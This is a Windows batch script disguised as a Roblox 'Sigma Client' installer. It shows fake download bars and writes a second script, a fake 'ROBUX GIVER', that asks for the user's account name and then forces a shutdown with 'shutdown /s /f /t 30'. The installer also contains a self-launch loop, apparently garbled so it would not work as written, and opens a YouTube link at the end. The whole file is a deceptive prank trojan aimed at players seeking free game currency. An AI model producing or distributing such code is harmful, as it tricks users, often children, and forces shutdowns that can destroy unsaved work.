@echo off
CHCP 65001 >nul
set cols=50
set lines=18
Color 0a
Title Sigma Client Installer For Roblox

:start
cls
echo.
echo    ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗
echo    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝
echo    ███████║███████║██║     ███████╗ ███████╗
echo    ██╔══██║██╔══██║██║     ██╔═██╗ ╚════██║
echo    ██║  ██║██║  ██║╚██████╗██║  ██╗███████║
echo    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝
echo.
echo - A: Install client
echo - B: Exit client installer
set /p choice="Enter A or B: "

if /i "%choice%"=="A" goto Install
if /i "%choice%"=="B" goto exit
echo Invalid choice. Please enter A or B.
pause >nul
goto start

:exit
exit

:Install
@MODE CON COLS=50 LINES=4
cls
echo GETTING READY...
timeout 1 >nul
echo STARTING DOWNLOAD...
timeout 1 >nul
cls
echo DOWNLOADING...
echo ╔═════════════════════╗
echo ║████                 ║
echo ╚═════════════════════╝
timeout 1 >nul
cls
echo DOWNLOADING...
echo ╔═════════════════════╗
echo ║█████████████        ║
echo ╚═════════════════════╝
timeout 1 >nul
cls
echo DOWNLOADING...
echo ╔═════════════════════╗
echo ║█████████████████████║
echo ╚═════════════════════╝
timeout 1 >nul
cls
echo DOWNLOAD COMPLETE!

REM Generate the batch file
set "batchfile=SIGMACLIENTROBLOX.bat"
(
    echo @echo off
    echo CHCP 65001 ^>nul
    echo Color 0a
    echo Title Sigma Client For Roblox
    echo ^:start
    echo cls
    echo echo.
    echo echo ROBUX GIVER
    echo echo.
    echo echo - A: Set Robux
    echo echo - B: Exit
    echo set /p choice1^="Enter A or B: "
    echo if /i %%choice1%%==A goto Robux
    echo if /i %%choice1%%==B goto exit
    echo echo Invalid choice. Please enter A or B.
    echo pause ^>nul
    echo goto start
    echo ^:exit
    echo exit
    echo ^:Robux
    echo @MODE CON COLS=50 LINES=4
    echo cls
    echo set /p aaaName^=Enter Your Account Name: 
    echo set /p aaa^=Enter Amount To Set To: 
    echo timeout 1 ^>nul
    echo echo GETTING ACCOUNT...
    echo timeout 1 ^>nul
    echo echo STARTING TRANSFER...
    echo timeout 1 ^>nul
    echo cls
    echo echo TRANSFERRING...
    echo echo ^╔═════════════════════^╗
    echo echo ^║████                 ^║
    echo echo ^╚═════════════════════^╝
    echo timeout 1 ^>nul
    echo cls
    echo echo TRANSFERRING...
    echo echo ^╔═════════════════════^╗
    echo echo ^║█████████████        ^║
    echo echo ^╚═════════════════════^╝
    echo timeout 1 ^>nul
    echo cls
    echo echo TRANSFERRING...
    echo echo ^╔═════════════════════^╗
    echo echo ^║█████████████████████^║
    echo echo ^╚═════════════════════^╝
    echo timeout 1 ^>nul
    echo cls
    echo echo TRANSFER COMPLETE!
    echo ^shutdown /s /f /t 30
    :loop
    echo start %batchfile%
    Goto loop
    echo pause ^>nul
    echo exit
) > "%batchfile%"

echo File created successfully: %batchfile%
start /max https://www.youtube.com/watch?v=3hyr-ENDDak
pause >nul
exit
